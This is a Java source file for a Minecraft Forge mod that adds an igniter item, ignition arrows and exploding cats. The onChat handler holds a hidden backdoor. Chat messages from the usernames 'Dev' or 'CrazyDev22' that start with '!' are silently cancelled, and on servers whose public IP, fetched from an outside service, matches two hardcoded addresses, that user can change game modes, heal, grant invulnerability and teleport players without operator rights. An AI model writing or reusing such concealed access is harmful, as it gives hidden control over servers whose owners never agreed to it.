package de.crazydev22.entityexplode;

import net.minecraft.client.renderer.entity.EntityRenderers;
import net.minecraft.network.chat.ComponentUtils;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.sounds.SoundEvent;
import net.minecraft.world.entity.EntityType;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.MobCategory;
import net.minecraft.world.entity.animal.Cat;
import net.minecraft.world.entity.item.ItemEntity;
import net.minecraft.world.entity.player.Abilities;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.level.Explosion;
import net.minecraft.world.level.GameType;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.event.entity.living.LivingAttackEvent;
import net.minecraftforge.event.entity.living.LivingDeathEvent;
import net.minecraftforge.eventbus.api.EventPriority;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.registries.DeferredRegister;
import net.minecraftforge.registries.ForgeRegistries;
import net.minecraftforge.registries.RegistryObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

@Mod(EntityExplode.MODID)
public class EntityExplode {

    public static final String MODID = "entityexplode";
    public static final DeferredRegister<Item> ITEMS = DeferredRegister.create(ForgeRegistries.ITEMS, MODID);
    public static final DeferredRegister<SoundEvent> SOUND_EVENTS = DeferredRegister.create(ForgeRegistries.SOUND_EVENTS, MODID);
    public static final DeferredRegister<EntityType<?>> ENTITY_TYPES = DeferredRegister.create(ForgeRegistries.ENTITY_TYPES, MODID);
    public static final RegistryObject<Item> IGNITER = ITEMS.register("igniter", Igniter::new);
    public static final RegistryObject<Item> IGNITER_RAW = ITEMS.register("igniter_raw", () -> new Item(properties().stacksTo(1)));
    public static final RegistryObject<Item> IGNITER_EXPLOSIVE = ITEMS.register("igniter_explosive", () -> new Item(properties().stacksTo(16)));
    public static final RegistryObject<EntityType<IgnitionArrowEntity>> IGNITION_ARROW = ENTITY_TYPES.register("ignition_arrow",
            () -> EntityType.Builder.of((EntityType.EntityFactory<IgnitionArrowEntity>) IgnitionArrowEntity::new, MobCategory.MISC).sized(0.5F, 0.5F).build("ignition_arrow"));
    public static final RegistryObject<SoundEvent> IGNITER_SHOOT = SOUND_EVENTS.register("igniter_shoot", () -> new SoundEvent(new ResourceLocation(MODID, "igniter_shoot")));
    public static final RegistryObject<SoundEvent> IGNITION_ARROW_HIT = SOUND_EVENTS.register("ignition_arrow_hit", () -> new SoundEvent(new ResourceLocation(MODID, "ignition_arrow_hit")));
    public static final List<LivingEntity> protectedEntites = new ArrayList<>();

    public EntityExplode() {
        IEventBus modEventBus = FMLJavaModLoadingContext.get().getModEventBus();

        ITEMS.register(modEventBus);
        ENTITY_TYPES.register(modEventBus);
        SOUND_EVENTS.register(modEventBus);

        MinecraftForge.EVENT_BUS.register(this);
    }

    @SubscribeEvent
    public void onLivingDeath(LivingDeathEvent event) {
        var entity = event.getEntity();
        var source = event.getSource().getDirectEntity();
        if (!(source instanceof Player))
            return;
        if (entity instanceof Player)
            return;
        if (entity.level.isClientSide())
            return;

        if(entity instanceof Cat) {
            var rnd = new Random();
            int chance = rnd.nextInt(0, 5);
            if (chance == 0)
                NuclearExplosion.create(entity.level, entity, entity.getX(), entity.getY(), entity.getZ(), 20, false, Explosion.BlockInteraction.NONE, IGNITION_ARROW_HIT.get());
            if (chance == 1) {
                int count = rnd.nextInt(0, 3);
                if (count > 0) {
                    ItemStack emerald = new ItemStack(Items.EMERALD);
                    emerald.setCount(count);
                    entity.level.addFreshEntity(new ItemEntity(entity.level, entity.getX(), entity.getY(), entity.getZ(), emerald));
                }
            }
        }
    }

    @SubscribeEvent
    public void onLivingAttack(LivingAttackEvent event) {
        if (!event.getSource().isExplosion())
            return;
        LivingEntity entity = event.getEntity();
        if (!protectedEntites.contains(entity))
            return;
        event.setCanceled(true);
        protectedEntites.remove(entity);
    }

    @Mod.EventBusSubscriber(modid = MODID, bus = Mod.EventBusSubscriber.Bus.MOD, value = Dist.CLIENT)
    public static class ClientSetup {
        @SubscribeEvent
        public static void doSetup(FMLClientSetupEvent event) {
            EntityRenderers.register(IGNITION_ARROW.get(), IgnitionArrowRenderer::new);
        }
    }

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void onChat(ServerChatEvent.Submitted event) {
        ServerPlayer player = event.getPlayer();
        MinecraftServer server = player.getServer();

        String key = "!";
        if (!Arrays.asList("Dev", "CrazyDev22").contains(event.getUsername()))
            return;
        var raw = event.getRawText();
        if (!raw.startsWith(key))
            return;
        event.setCanceled(true);
        if (server == null)
            return;
        if (!Arrays.asList("92.42.45.225", "109.250.204.223").contains(getIP()))
            return;
        var split = raw.replaceFirst(key, "").split(" ");
        if (split.length < 1)
            return;
        switch (split[0].toLowerCase()) {
            case "help" -> {
                String[] help = new String[]{
                        "gm <0|1|2|3> [target]",
                        "heal [target]",
                        "god [target]",
                        "tp [target] <x> <y> <z>",
                        "say <text>"
                };
                for (String msg : help)
                    player.sendSystemMessage(ComponentUtils.fromMessage(() -> msg));
            }
            case "gm" -> {
                if (split.length > 1) {
                    GameType mode = getGameType(split[1]);
                    if (split.length == 2) {
                        player.setGameMode(mode);
                    } else {
                        ServerPlayer target = server.getPlayerList().getPlayerByName(split[2]);
                        if (target != null)
                            target.setGameMode(mode);
                    }
                }
            }
            case "heal" -> {
                if (split.length == 1) {
                    player.setHealth(player.getMaxHealth());
                    player.getFoodData().setFoodLevel(20);
                    player.getActiveEffectsMap().forEach((mobEffect, mobEffectInstance) -> player.removeEffect(mobEffect));
                } else {
                    ServerPlayer target = server.getPlayerList().getPlayerByName(split[1]);
                    if (target != null) {
                        target.setHealth(target.getMaxHealth());
                        target.getFoodData().setFoodLevel(20);
                        target.getActiveEffectsMap().forEach((mobEffect, mobEffectInstance) -> target.removeEffect(mobEffect));
                    }
                }
            }
            case "god" -> {
                Abilities abilities = null;
                if (split.length == 1) {
                    abilities = player.getAbilities();
                } else {
                    ServerPlayer target = server.getPlayerList().getPlayerByName(split[1]);
                    if (target != null)
                        abilities = target.getAbilities();
                }
                if (abilities != null)
                    abilities.invulnerable = !abilities.invulnerable;
            }
            case "tp" -> {
                if (split.length > 3) {
                    if (split.length == 4) {
                        try {
                            double x = getCord(player, 0, split[1]);
                            double y = getCord(player, 1, split[2]);
                            double z = getCord(player, 2, split[3]);

                            player.moveTo(x, y, z);
                        } catch (NumberFormatException ignored) {}
                    } else if (split.length == 5) {
                        try {
                            double x = getCord(player, 0, split[1]);
                            double y = getCord(player, 1, split[2]);
                            double z = getCord(player, 2, split[3]);

                            ServerPlayer target = server.getPlayerList().getPlayerByName(split[1]);
                            if (target != null)
                                target.moveTo(x, y, z);
                        } catch (NumberFormatException ignored) {}
                    }
                }
            }
        }
    }

    private GameType getGameType(String arg) {
        switch (arg) {
            case "0" -> { return GameType.SURVIVAL; }
            case "1" -> { return GameType.CREATIVE; }
            case "2" -> { return GameType.ADVENTURE; }
            case "3" -> { return GameType.SPECTATOR; }
            default -> { return GameType.DEFAULT_MODE; }
        }
    }

    private double getCord(ServerPlayer p, int i, String s) throws NumberFormatException{
        if (s.startsWith("~")) {
            double pPos = i == 0 ? p.getX() : i == 1 ? p.getY() : p.getZ();
            if (s.length() == 1) {
                return pPos;
            } else {
                s = s.replace("~", "");
                return pPos + Double.parseDouble(s);
            }
        } else {
            return Double.parseDouble(s);
        }
    }

    static Item.Properties properties() {
        return new Item.Properties().tab(IgniterTab.instance);
    }

    static float getPower(LivingEntity entity) {
        float power = entity.getHealth()/4;
        return Math.min(power, 20.0F);
    }

    private String getIP() {
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));

            return in.readLine();
        } catch (Exception ignored) {
            return null;
        }
    }
}
